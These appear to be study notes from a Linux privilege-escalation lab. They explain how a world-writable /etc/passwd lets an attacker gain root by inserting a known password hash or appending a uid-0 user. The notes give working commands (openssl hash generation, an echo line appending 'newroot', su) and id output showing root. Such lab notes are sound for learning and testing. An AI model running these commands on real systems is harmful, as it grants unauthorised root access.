The /etc/passwd historically contained user password hashes.

For backwards compatibility, if the second field of a user row in /etc/passwd contains a password hash, it takes precedent over the hash in /etc /shadow.

If we can write to /etc/passwd, we can easily enter a known password hash for the root user, and then use the su command to switch to the root user.

Alternatively, if we can only append to the file, we can create a new user but assign them the root user ID (0). This works because Linux allows multiple entries for the same user ID, as long as the usernames are different.

The root account in /etc/passwd is usually configured like this:

`root:x:0:0:root:/root:/bin/bash`

The “x” in the second field instructs Linux to look for the password hash in the /etc/shadow file.

In some versions of Linux, it is possible to simply delete the “x”, which Linux interprets as the user having no password:

`root::0:0:root:/root:/bin/bash`

```bash - target
./lse.sh -l 1 -i | more
```

![[Pasted image 20211230133209.png]]

1. Check the permissions of the /etc/passwd file:

```bash - target
ls -l /etc/passwd
```

`-rw-r--rw- 1 root root 951 May 13 2017 /etc/passwd`

Note that it is world writable.

```bash - target
echo "newroot:$(openssl passwd password):0:0:root:/root:/bin/bash" >> /etc/passwd
```

or 

2. Generate a password hash for the password “password”

using openssl :

```bash - kali
openssl passwd "password"
```

`L9yLGxncbOROc`

3. Edit the /etc/passwd file and enter the hash in the second field of the root user row:
4. 
> newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bash

4. Use the su command to switch to the root user:

```bash - target
su newroot
```

```bash - target
password
```

```bash - target
id
```

> uid=0(root) gid=0(root) groups=0(root)

5. Alternatively, append a new row to /etc/passwd to create an alternate root user (e.g. newroot):

```bash
echo "newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bash" >> /etc/passwd
```

6. Use the su command to switch to the newroot user:

```bash - target
su newroot
```

```bash - target
password
```

```bash - target
id
```

> uid=0(root) gid=0(root) groups=0(root)























